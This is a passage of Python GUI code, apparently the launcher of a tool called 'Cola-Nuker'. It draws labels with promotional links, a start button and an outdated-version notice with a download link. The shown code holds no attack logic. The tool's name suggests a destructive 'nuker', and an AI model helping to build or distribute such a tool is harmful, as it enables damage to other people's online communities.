    bel2.place(relx=0.5, rely=0.55, anchor=tkinter.CENTER)
    bel3 = customtkinter.CTkLabel(master=app, text="https://blizz.cf/\nhttps://github.com/LuyaTools\nhttps://t.me/bladetools", text_color="#ffffff", font=('Calibri', 15))
    bel3.place(relx=0.5, rely=0.8, anchor=tkinter.CENTER)
    button = customtkinter.CTkButton(master=app,
                                 width=120,
                                 height=32,
                                 hover_color="#ff0000",
                                 fg_color="#000000",
                                 border_width=0,
                                 corner_radius=8,
                                 text="Start Cola-Nuker",
                                 command=home)
    button.place(relx=0.5, rely=0.2, anchor=tkinter.CENTER)
    app.mainloop()
else:
    bel2 = customtkinter.CTkLabel(master=app, text="You are using an old version of COLA-NUKER!\nDownload the latest version here:\nhttps://blizz.cf/tools/colanuker/downloads.html")
    bel2.place(relx=0.5, rely=0.5, anchor=tkinter.CENTER)
    app.mainloop()
